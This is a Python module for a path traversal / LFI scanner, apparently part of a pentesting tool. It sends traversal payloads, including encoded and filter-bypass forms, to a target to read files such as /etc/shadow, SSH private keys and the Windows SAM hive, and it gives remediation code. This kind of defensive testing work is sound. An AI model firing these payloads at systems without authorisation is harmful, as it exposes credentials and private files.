"""
Path Traversal / Local File Inclusion (LFI) Scanner

Detects path traversal and LFI vulnerabilities allowing unauthorized file access.
"""
import asyncio
import logging
import re
from typing import List, Optional, Callable, Dict, Set
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from app.models import Vulnerability, SeverityLevel, VulnerabilityCategory
from app.utils import PentestHTTPClient

logger = logging.getLogger(__name__)

class PathTraversalScanner:
    """
    Scanner for path traversal and LFI vulnerabilities

    Tests for:
    - Classic path traversal (../../../etc/passwd)
    - Null byte injection (%00)
    - Encoding bypass (URL encoding, double encoding)
    - Windows path traversal
    - Filter bypass techniques
    - Sensitive file disclosure
    """

    # Linux sensitive files to test
    LINUX_SENSITIVE_FILES = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/etc/group',
        '/etc/resolv.conf',
        '/etc/hostname',
        '/etc/issue',
        '/proc/self/environ',
        '/proc/version',
        '/proc/cmdline',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/var/log/auth.log',
        '/home/user/.bash_history',
        '/root/.bash_history',
        '/home/user/.ssh/id_rsa',
        '/root/.ssh/id_rsa',
    ]

    # Windows sensitive files to test
    WINDOWS_SENSITIVE_FILES = [
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\Windows\\System32\\config\\SYSTEM',
        'C:\\Windows\\win.ini',
        'C:\\Windows\\System.ini',
        'C:\\boot.ini',
        'C:\\Windows\\debug\\NetSetup.log',
        'C:\\inetpub\\wwwroot\\web.config',
        'C:\\Windows\\Panther\\Unattend.xml',
    ]

    # Indicators of successful file read
    FILE_SIGNATURES = {
        '/etc/passwd': [b'root:', b'/bin/bash', b'/bin/sh', b'daemon:'],
        '/etc/shadow': [b'root:', b'$1$', b'$6$', b'!!'],
        '/etc/hosts': [b'localhost', b'127.0.0.1'],
        'hosts': [b'localhost', b'127.0.0.1'],
        '/etc/group': [b'root:', b'sudo:', b'users:'],
        '/proc/version': [b'Linux version', b'gcc version'],
        'win.ini': [b'[fonts]', b'[extensions]', b'[files]'],
        'boot.ini': [b'[boot loader]', b'[operating systems]'],
        'SAM': [b'SAM', b'samss'],
    }

    # URL parameters commonly vulnerable to path traversal
    VULNERABLE_PARAMS = [
        'file', 'path', 'page', 'filename', 'template', 'document',
        'doc', 'view', 'img', 'image', 'load', 'include', 'download',
        'dir', 'folder', 'read', 'show', 'display', 'content',
        'src', 'source', 'data', 'resource', 'location', 'url'
    ]

    def __init__(
        self,
        client: PentestHTTPClient,
        scan_depth: str = "balanced",
        progress_callback: Optional[Callable] = None
    ):
        self.client = client
        self.scan_depth = scan_depth
        self.progress_callback = progress_callback
        self.tested_combinations: Set[str] = set()

    async def scan(self, endpoints: Optional[List[str]] = None) -> List[Vulnerability]:
        """
        Scan for path traversal vulnerabilities

        Args:
            endpoints: List of discovered endpoints (optional)

        Returns:
            List of path traversal vulnerabilities found
        """
        vulnerabilities = []

        logger.info("📁 Path Traversal Scanner started")

        if not endpoints:
            endpoints = [self.client.base_url]

        # Filter endpoints that might be vulnerable
        testable_endpoints = self._find_testable_endpoints(endpoints)

        # Determine test depth
        max_endpoints = {
            'quick': 10,
            'balanced': 30,
            'deep': 100
        }.get(self.scan_depth, 30)

        testable_endpoints = testable_endpoints[:max_endpoints]

        logger.info(f"Testing {len(testable_endpoints)} endpoints for path traversal ({self.scan_depth} mode)")

        # Test each endpoint
        for i, endpoint in enumerate(testable_endpoints):
            if self.progress_callback:
                await self.progress_callback(
                    f"Path Traversal: Testing endpoint {i+1}/{len(testable_endpoints)}: {endpoint}"
                )

            # Test parameter-based traversal
            vulns = await self._test_parameter_traversal(endpoint)
            vulnerabilities.extend(vulns)

            # Test path-based traversal
            vulns = await self._test_path_traversal(endpoint)
            vulnerabilities.extend(vulns)

            await asyncio.sleep(0.05)  # Rate limiting

        # Deduplicate vulnerabilities
        vulnerabilities = self._deduplicate_vulnerabilities(vulnerabilities)

        logger.info(f"✅ Path Traversal scan complete: {len(vulnerabilities)} unique issues found")
        return vulnerabilities

    def _find_testable_endpoints(self, endpoints: List[str]) -> List[str]:
        """Find endpoints that might be vulnerable to path traversal"""
        testable = []

        for endpoint in endpoints:
            # Endpoints with parameters
            if '?' in endpoint:
                parsed = urlparse(endpoint)
                params = parse_qs(parsed.query)

                # Check if any parameter name suggests file operations
                for param in params.keys():
                    if any(vuln_param in param.lower() for vuln_param in self.VULNERABLE_PARAMS):
                        testable.append(endpoint)
                        break
                else:
                    # Even without obvious param names, include if has params
                    testable.append(endpoint)

            # Endpoints that look like file viewers/downloaders
            elif any(pattern in endpoint.lower() for pattern in [
                '/view', '/download', '/file', '/read', '/get', '/show',
                '/display', '/image', '/img', '/doc', '/document', '/page',
                '/include', '/load', '/template', '/content'
            ]):
                testable.append(endpoint)

        # If no obvious candidates, test common patterns
        if not testable:
            base_url = self.client.base_url
            common_patterns = [
                f"{base_url}/view?file=test.txt",
                f"{base_url}/download?filename=test.pdf",
                f"{base_url}/file?path=/test",
                f"{base_url}/page?template=index",
                f"{base_url}/read?doc=test",
            ]
            testable.extend(common_patterns)

        return testable

    async def _test_parameter_traversal(self, endpoint: str) -> List[Vulnerability]:
        """Test path traversal via URL parameters"""
        vulnerabilities = []

        parsed = urlparse(endpoint)
        if not parsed.query:
            return vulnerabilities

        params = parse_qs(parsed.query)

        # Test each parameter
        for param_name in params.keys():
            # Generate payloads
            payloads = self._generate_payloads()

            # Limit payloads based on scan depth
            max_payloads = {
                'quick': 10,
                'balanced': 25,
                'deep': len(payloads)
            }.get(self.scan_depth, 25)

            for payload, target_file in payloads[:max_payloads]:
                # Build test URL
                test_params = params.copy()
                test_params[param_name] = [payload]

                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                # Skip if already tested
                test_key = f"{test_url}|{payload}"
                if test_key in self.tested_combinations:
                    continue
                self.tested_combinations.add(test_key)

                # Test the payload
                try:
                    response = await self.client.get(test_url)
                    if not response:
                        continue

                    # Check if file content is exposed
                    if self._is_file_exposed(response.text, response.content, target_file):
                        vulnerabilities.append(Vulnerability(
                            id=f"path_traversal_param_{hash(test_url)}_{hash(payload)}",
                            title="Path Traversal / Local File Inclusion (LFI)",
                            description=f"Path traversal vulnerability allows reading arbitrary files from the server via parameter '{param_name}'",
                            severity=SeverityLevel.HIGH,
                            category=VulnerabilityCategory.PATH_TRAVERSAL,
                            affected_url=endpoint,
                            proof_of_concept=f"Successfully read sensitive file using payload:\\n\\n"
                                           f"URL: {test_url}\\n"
                                           f"Parameter: {param_name}\\n"
                                           f"Payload: {payload}\\n"
                                           f"Target File: {target_file}\\n\\n"
                                           f"Response contained file signatures indicating successful file read.",
                            payload=payload,
                            remediation="**Critical: Path Traversal Remediation**\\n\\n"
                                      "1. **Input Validation**\\n"
                                      "   - Whitelist allowed filenames (NO blacklisting)\\n"
                                      "   - Reject any input containing: ../ .\\\\ %00 %2e %5c\\n"
                                      "   - Use basename() to strip directory paths\\n\\n"
                                      "2. **Indirect References**\\n"
                                      "   - Use file IDs instead of filenames\\n"
                                      "   - Example: ?file_id=123 → maps to allowed_files[123]\\n\\n"
                                      "3. **Restrict File Access**\\n"
                                      "   - Use chroot jail or realpath() validation\\n"
                                      "   - Check that resolved path is within allowed directory\\n\\n"
                                      "4. **Code Examples**\\n\\n"
                                      "Python (Flask):\\n"
                                      "```python\\n"
                                      "from werkzeug.utils import secure_filename\\n"
                                      "import os\\n\\n"
                                      "ALLOWED_DIR = '/var/www/files'\\n\\n"
                                      "@app.route('/file')\\n"
                                      "def get_file():\\n"
                                      "    filename = request.args.get('file')\\n"
                                      "    # Sanitize input\\n"
                                      "    filename = secure_filename(filename)\\n"
                                      "    filepath = os.path.join(ALLOWED_DIR, filename)\\n"
                                      "    \\n"
                                      "    # Verify path is within allowed directory\\n"
                                      "    real_path = os.path.realpath(filepath)\\n"
                                      "    if not real_path.startswith(os.path.realpath(ALLOWED_DIR)):\\n"
                                      "        abort(403)\\n"
                                      "    \\n"
                                      "    return send_file(real_path)\\n"
                                      "```\\n\\n"
                                      "PHP:\\n"
                                      "```php\\n"
                                      "$allowed_dir = '/var/www/files';\\n"
                                      "$filename = basename($_GET['file']); // Remove directory\\n"
                                      "$filepath = $allowed_dir . '/' . $filename;\\n\\n"
                                      "// Verify path\\n"
                                      "$real_path = realpath($filepath);\\n"
                                      "if (strpos($real_path, realpath($allowed_dir)) !== 0) {\\n"
                                      "    die('Invalid file path');\\n"
                                      "}\\n"
                                      "```\\n\\n"
                                      "Node.js:\\n"
                                      "```javascript\\n"
                                      "const path = require('path');\\n"
                                      "const fs = require('fs');\\n\\n"
                                      "const allowedDir = '/var/www/files';\\n"
                                      "const filename = path.basename(req.query.file);\\n"
                                      "const filepath = path.join(allowedDir, filename);\\n\\n"
                                      "// Verify path is within allowed directory\\n"
                                      "const realPath = fs.realpathSync(filepath);\\n"
                                      "if (!realPath.startsWith(fs.realpathSync(allowedDir))) {\\n"
                                      "    return res.status(403).send('Forbidden');\\n"
                                      "}\\n"
                                      "```",
                            cwe_id="CWE-22",
                            owasp_category="A01:2021 – Broken Access Control",
                            references=[
                                "https://owasp.org/www-community/attacks/Path_Traversal",
                                "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html",
                                "https://portswigger.net/web-security/file-path-traversal"
                            ]
                        ))
                        logger.info(f"🚨 Path traversal: {test_url} (payload: {payload})")
                        break  # Found vulnerability, no need to test more payloads for this param

                except Exception as e:
                    logger.debug(f"Error testing path traversal {test_url}: {e}")

                await asyncio.sleep(0.05)

        return vulnerabilities

    async def _test_path_traversal(self, endpoint: str) -> List[Vulnerability]:
        """Test path traversal via URL path manipulation"""
        vulnerabilities = []

        parsed = urlparse(endpoint)
        base_path = parsed.path

        # Generate path-based payloads
        path_payloads = [
            '../etc/passwd',
            '../../etc/passwd',
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
        ]

        # Limit based on scan depth
        max_payloads = {
            'quick': 3,
            'balanced': 5,
            'deep': len(path_payloads)
        }.get(self.scan_depth, 5)

        for payload in path_payloads[:max_payloads]:
            test_path = f"{base_path.rstrip('/')}/{payload}"
            test_url = f"{parsed.scheme}://{parsed.netloc}{test_path}"

            if parsed.query:
                test_url += f"?{parsed.query}"

            # Skip if already tested
            if test_url in self.tested_combinations:
                continue
            self.tested_combinations.add(test_url)

            try:
                response = await self.client.get(test_url)
                if not response:
                    continue

                # Check if file content is exposed
                if self._is_file_exposed(response.text, response.content, '/etc/passwd'):
                    vulnerabilities.append(Vulnerability(
                        id=f"path_traversal_path_{hash(test_url)}",
                        title="Path Traversal in URL Path",
                        description="Path traversal vulnerability in URL path allows reading arbitrary files",
                        severity=SeverityLevel.HIGH,
                        category=VulnerabilityCategory.PATH_TRAVERSAL,
                        affected_url=endpoint,
                        proof_of_concept=f"Successfully exploited path traversal:\\n\\n"
                                       f"URL: {test_url}\\n"
                                       f"Payload: {payload}\\n\\n"
                                       f"The server returned file content indicating successful traversal.",
                        payload=payload,
                        remediation="Prevent path traversal in URL routing. "
                                  "Validate and sanitize all path segments. "
                                  "Use whitelist of allowed paths. "
                                  "Implement proper access controls.",
                        cwe_id="CWE-22",
                        owasp_category="A01:2021 – Broken Access Control",
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal"
                        ]
                    ))
                    logger.info(f"🚨 Path traversal (URL path): {test_url}")
                    break

            except Exception as e:
                logger.debug(f"Error testing path in URL {test_url}: {e}")

        return vulnerabilities

    def _generate_payloads(self) -> List[tuple]:
        """
        Generate path traversal payloads

        Returns:
            List of (payload, target_file) tuples
        """
        payloads = []

        # Linux files
        for file in self.LINUX_SENSITIVE_FILES[:5]:  # Top 5 most common
            # Classic traversal
            payloads.extend([
                (f"../../../..{file}", file),
                (f"../../../../..{file}", file),
                (f"../../../../../..{file}", file),
                (f"../../../../../../..{file}", file),
                (f"../../../../../../../..{file}", file),
            ])

            # Null byte injection (legacy PHP)
            payloads.extend([
                (f"../../../..{file}%00", file),
                (f"../../../..{file}%00.jpg", file),
            ])

            # URL encoding
            payloads.extend([
                (f"..%2F..%2F..%2F..{file}", file),
                (f"..%252F..%252F..%252F..{file}", file),  # Double encoding
            ])

            # Filter bypass
            payloads.extend([
                (f"....//....//....//..{file}", file),
                (f"..;/..;/..;/..{file}", file),
                (f".%2e/.%2e/.%2e/.%2e{file}", file),
            ])

        # Windows files
        for file in self.WINDOWS_SENSITIVE_FILES[:3]:  # Top 3
            # Windows path traversal
            payloads.extend([
                (f"..\\..\\..\\{file}", file),
                (f"..%5c..%5c..%5c{file}", file),
                (f"..%255c..%255c..%255c{file}", file),
            ])

        # Absolute paths (sometimes work)
        payloads.extend([
            ("/etc/passwd", "/etc/passwd"),
            ("/etc/shadow", "/etc/shadow"),
            ("C:\\Windows\\win.ini", "win.ini"),
        ])

        return payloads

    def _is_file_exposed(self, text: str, content: bytes, target_file: str) -> bool:
        """
        Check if response contains file content

        Args:
            text: Response text
            content: Response bytes
            target_file: Target file path

        Returns:
            True if file appears to be exposed
        """
        # Check for common signatures
        for file_pattern, signatures in self.FILE_SIGNATURES.items():
            if file_pattern in target_file.lower():
                for signature in signatures:
                    if signature in content:
                        return True

        # Generic checks
        if len(content) > 100:  # Reasonable file size
            # Check for typical file patterns
            if b'root:' in content and (b'/bin/bash' in content or b'/bin/sh' in content):
                return True  # Looks like /etc/passwd

            if b'[fonts]' in content and b'[extensions]' in content:
                return True  # Looks like win.ini

            if b'[boot loader]' in content:
                return True  # Looks like boot.ini

            # Check for common Linux paths
            if b'/usr/' in content and b'/etc/' in content and b'/var/' in content:
                return True

        return False

    def _deduplicate_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Remove duplicate vulnerabilities"""
        seen = set()
        unique = []

        for vuln in vulnerabilities:
            # Create a key based on URL and general payload pattern
            parsed = urlparse(vuln.affected_url)
            base_url = f"{parsed.netloc}{parsed.path}"

            # Generalize payload (all ../../../etc/passwd variations = same vuln)
            payload_pattern = re.sub(r'(\.\.\/)+', '../', vuln.payload)
            payload_pattern = re.sub(r'(%2[Ff])+', '%2F', payload_pattern)

            key = f"{base_url}|{payload_pattern}"

            if key not in seen:
                seen.add(key)
                unique.append(vuln)

        return unique
